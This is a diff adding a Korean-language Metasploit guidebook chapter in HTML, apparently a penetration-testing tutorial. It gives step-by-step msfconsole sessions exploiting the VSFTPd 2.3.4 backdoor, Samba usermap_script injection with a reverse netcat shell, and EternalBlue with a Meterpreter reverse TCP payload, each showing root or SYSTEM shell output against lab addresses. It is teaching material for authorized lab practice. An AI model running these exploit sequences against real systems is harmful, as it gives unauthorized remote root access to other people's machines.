@@ -1,0 +1,363 @@
+<!doctype html>
+<html lang="ko">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chapter 07 — 취약점 분석 & 공격 | Metasploit 가이드북</title>
+    <link rel="stylesheet" href="../css/style.css" />
+  </head>
+  <body>
+    <div class="reading-progress"><div class="reading-progress-bar"></div></div>
+    <aside class="sidebar">
+      <div class="sidebar-logo">
+        <div class="logo-icon">
+          <svg
+            width="22"
+            height="22"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+          >
+            <path d="M12 2L2 7l10 5 10-5-10-5z" />
+            <path d="M2 17l10 5 10-5" />
+            <path d="M2 12l10 5 10-5" />
+          </svg>
+          Metasploit 가이드북
+        </div>
+        <p>침투 테스트 완전 정복</p>
+      </div>
+      <nav class="sidebar-nav">
+        <div class="nav-section-label">시작하기</div>
+        <a href="../index.html"
+          ><span class="nav-num">00</span> 목차 &amp; 개요</a
+        >
+        <a href="chapter1.html"
+          ><span class="nav-num">01</span> Metasploit이란?</a
+        >
+        <a href="chapter2.html"
+          ><span class="nav-num">02</span> 설치 &amp; 환경 구성</a
+        >
+        <div class="nav-section-label">핵심 개념</div>
+        <a href="chapter3.html"
+          ><span class="nav-num">03</span> MSF 콘솔 기초</a
+        >
+        <a href="chapter4.html"
+          ><span class="nav-num">04</span> Exploit &amp; Payload</a
+        >
+        <a href="chapter5.html"
+          ><span class="nav-num">05</span> Meterpreter 완전 정복</a
+        >
+        <div class="nav-section-label">실전 기술</div>
+        <a href="chapter6.html"
+          ><span class="nav-num">06</span> 정보 수집 &amp; 스캔</a
+        >
+        <a href="chapter7.html" class="active"
+          ><span class="nav-num">07</span> 취약점 분석 &amp; 공격</a
+        >
+        <a href="chapter8.html"
+          ><span class="nav-num">08</span> 포스트 익스플로잇</a
+        >
+        <div class="nav-section-label">심화 &amp; 윤리</div>
+        <a href="chapter9.html"
+          ><span class="nav-num">09</span> 커스텀 모듈 개발</a
+        >
+        <a href="chapter10.html"
+          ><span class="nav-num">10</span> 윤리 &amp; 법적 기준</a
+        >
+      </nav>
+      <div class="sidebar-footer">⚠️ 교육 목적 전용 — 무단 사용 금지</div>
+    </aside>
+    <main class="main">
+      <div class="chapter-header">
+        <div class="chapter-badge">Chapter 07</div>
+        <h1>취약점 분석 &amp; 공격</h1>
+        <p class="subtitle">
+          실제 CVE를 분석하고 익스플로잇하는 과정 — EternalBlue(MS17-010),
+          VSFTPd 백도어, Samba, 그리고 체계적인 공격 방법론
+        </p>
+      </div>
+
+      <div class="callout danger">
+        <div class="callout-icon">⛔</div>
+        <div class="callout-body">
+          <strong
+            >이 챕터의 모든 실습은 Metasploitable 2 또는 허가된 환경에서만
+            진행하세요</strong
+          >
+          <p>
+            아래 기술된 모든 공격 기법은 실제 운영 시스템에 사용하면 불법입니다.
+            반드시 격리된 실습 환경에서만 실행하세요.
+          </p>
+        </div>
+      </div>
+
+      <section class="section">
+        <h2>🎯 실습 1: VSFTPd 2.3.4 백도어 (CVE-2011-2523)</h2>
+        <p>
+          Metasploitable 2에 설치된 VSFTPd 2.3.4는 특별한 이유로 악명 높습니다.
+          2011년 공식 배포 서버가 해킹당해 백도어가 심어진 버전이 한동안
+          유포되었습니다. 사용자 이름에 스마일 이모티콘(:<span>)</span>을 붙이면
+          6200번 포트로 root 셸이 열립니다.
+        </p>
+        <p>
+          이 취약점은 소프트웨어 공급망 공격(Supply Chain Attack)의 초기 사례로,
+          신뢰할 수 있어 보이는 공식 채널을 통해 악성 코드가 배포될 수 있음을
+          보여준 역사적인 사건입니다.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real"
+              >🔨 VSFTPd 백도어 익스플로잇 전체 과정</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm"># 1단계: FTP 서비스 버전 확인</span>
+msf6 > use auxiliary/scanner/ftp/ftp_version
+msf6 > set RHOSTS 192.168.56.101
+msf6 > run
+<span class="st">[+] 192.168.56.101:21 FTP Banner: '220 (vsFTPd 2.3.4)\r\n'</span>
+
+<span class="cm"># 2단계: 해당 취약점 검색</span>
+msf6 > search vsftpd 2.3.4
+<span class="cm">#  0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent</span>
+
+<span class="cm"># 3단계: 모듈 로드 및 옵션 확인</span>
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(vsftpd_234_backdoor) > show options
+
+<span class="cm"># 4단계: 타깃 설정</span>
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
+
+<span class="cm"># 5단계: 익스플로잇 실행</span>
+msf6 exploit(vsftpd_234_backdoor) > exploit
+
+<span class="cm"># 성공 시:</span>
+<span class="st">[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)</span>
+<span class="st">[+] 192.168.56.101:21 - Backdoor service has been spawned</span>
+<span class="st">[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)</span>
+<span class="st">[*] Command shell session 1 opened</span>
+
+<span class="cm"># 6단계: 셸 확인</span>
+id
+<span class="st">uid=0(root) gid=0(root) groups=0(root)</span>
+
+whoami
+<span class="st">root</span></code></pre>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-icon">💡</div>
+          <div class="callout-body">
+            <strong>내부 동작 이해</strong>
+            <p>
+              이 익스플로잇은 FTP 로그인 시도에서 사용자명에 <code>:)</code>가
+              포함되면 서버가 6200번 포트를 열고 그 포트로 bash를 바인딩하도록
+              트리거합니다. 모듈이 하는 일은 이 트리거를 발동시키고, 6200번에
+              TCP 연결을 맺어 셸을 반환하는 것입니다.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🎯 실습 2: Samba "username map script" (CVE-2007-2447)</h2>
+        <p>
+          Metasploitable 2에 설치된 Samba 3.0.20은 사용자명 매핑 기능에 심각한
+          명령 인젝션 취약점이 있습니다. 인증 없이 원격에서 root 권한 명령
+          실행이 가능합니다.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real">🔨 Samba 명령 인젝션</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm"># SMB 버전 확인으로 취약한 Samba 감지</span>
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 > set RHOSTS 192.168.56.101
+msf6 > run
+<span class="st">[*] Host is running Unix Samba 3.0.20-Debian</span>
+
+<span class="cm"># 취약점 모듈 검색</span>
+msf6 > search samba usermap
+
+<span class="cm"># 모듈 사용</span>
+msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(usermap_script) > set RHOSTS 192.168.56.101
+msf6 exploit(usermap_script) > set LHOST 192.168.56.100
+
+<span class="cm"># 페이로드 설정 (리버스 셸)</span>
+msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
+
+msf6 exploit(usermap_script) > exploit
+<span class="st">[*] Started reverse handler</span>
+<span class="st">[+] Command shell session 1 opened</span>
+
+id
+<span class="st">uid=0(root) gid=0(root)</span></code></pre>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🎯 실습 3: MS17-010 EternalBlue (CVE-2017-0144)</h2>
+        <p>
+          EternalBlue는 NSA가 개발하고 Shadow Brokers가 유출한 익스플로잇으로,
+          2017년 WannaCry 랜섬웨어가 전 세계에 퍼진 핵심 원인입니다. Windows
+          SMBv1 프로토콜의 버퍼 오버플로우 취약점으로, 패치 없는 Windows 7/2008
+          R2 시스템에 인증 없이 원격 코드 실행이 가능합니다.
+        </p>
+
+        <div class="callout warning">
+          <div class="callout-icon">⚠️</div>
+          <div class="callout-body">
+            <strong>Windows VM 필요</strong>
+            <p>
+              이 실습은 Windows Server 2008 R2 또는 Windows 7 (패치 없는) VM이
+              필요합니다. Metasploitable은 Linux 기반이라 해당하지 않습니다.
+              VulnHub 또는 직접 구성한 환경에서 실습하세요.
+            </p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real">🔨 EternalBlue 익스플로잇</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm"># 1단계: MS17-010 취약점 여부 스캔</span>
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 > set RHOSTS 192.168.56.102
+msf6 > run
+<span class="st">[+] 192.168.56.102:445 - Host is likely VULNERABLE to MS17-010!</span>
+
+<span class="cm"># 2단계: EternalBlue 익스플로잇</span>
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.102
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.100
+msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(ms17_010_eternalblue) > exploit
+
+<span class="st">[*] Started reverse TCP handler on 192.168.56.100:4444</span>
+<span class="st">[*] 192.168.56.102:445 - Connecting to target for exploitation.</span>
+<span class="st">[+] 192.168.56.102:445 - Connection established for exploitation.</span>
+<span class="st">[*] Sending stage (200262 bytes)</span>
+<span class="st">[*] Meterpreter session 1 opened</span>
+
+meterpreter > getuid
+<span class="st">Server username: NT AUTHORITY\SYSTEM</span></code></pre>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>📋 취약점 발견 → 익스플로잇 체계적 접근법</h2>
+        <p>
+          무작정 익스플로잇을 시도하지 않고, 발견한 취약점을 체계적으로
+          우선순위화하는 방법입니다.
+        </p>
+
+        <div class="card">
+          <ol class="step-list">
+            <li>
+              <div class="step-num">1</div>
+              <div class="step-body">
+                <strong>서비스 버전 정확히 확인</strong>
+                <p>
+                  Nmap <code>-sV</code> 또는 Auxiliary 스캐너로 정확한 버전을
+                  파악합니다. "Apache"가 아니라 "Apache 2.4.49"처럼 구체적이어야
+                  합니다.
+                </p>
+              </div>
+            </li>
+            <li>
+              <div class="step-num">2</div>
+              <div class="step-body">
+                <strong>CVE 데이터베이스 검색</strong>
+                <p>
+                  nvd.nist.gov 또는 cve.mitre.org에서 해당 버전의 알려진 CVE를
+                  검색합니다. CVSS 점수 7.0 이상 우선 확인.
+                </p>
+              </div>
+            </li>
+            <li>
+              <div class="step-num">3</div>
+              <div class="step-body">
+                <strong>MSF 모듈 존재 여부 확인</strong>
+                <p>
+                  <code>search cve:YYYY-XXXX</code>로 Metasploit 모듈이 있는지
+                  확인합니다. 없다면 Exploit-DB, GitHub에서 PoC를 찾습니다.
+                </p>
+              </div>
+            </li>
+            <li>
+              <div class="step-num">4</div>
+              <div class="step-body">
+                <strong>check 명령어로 사전 검증</strong>
+                <p>
+                  모듈이 <code>check</code>를 지원한다면, 실제 익스플로잇 전에
+                  취약 여부를 확인합니다. 불필요한 시스템 충돌을 방지합니다.
+                </p>
+              </div>
+            </li>
+            <li>
+              <div class="step-num">5</div>
+              <div class="step-body">
+                <strong>익스플로잇 후 증거 보존</strong>
+                <p>
+                  성공한 세션에서 스크린샷, 사용자 목록, 파일 목록 등 증거를
+                  수집합니다. 보고서 작성의 핵심 근거가 됩니다.
+                </p>
+              </div>
+            </li>
+          </ol>
+        </div>
+      </section>
+
+      <div
+        style="
+          display: flex;
+          justify-content: space-between;
+          margin-top: 40px;
+          padding-top: 24px;
+          border-top: 1px solid var(--border);
+        "
+      >
+        <a
+          href="chapter6.html"
+          style="
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            background: var(--bg-card2);
+            color: var(--text-muted);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 14px;
+          "
+          >← Chapter 06: 정보 수집 &amp; 스캔</a
+        >
+        <a
+          href="chapter8.html"
+          style="
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            background: var(--accent-soft);
+            color: var(--accent2);
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+          "
+          >Chapter 08: 포스트 익스플로잇 →</a
+        >
+      </div>
+    </main>
+    <script src="../js/main.js"></script>
+  </body>
+</html>
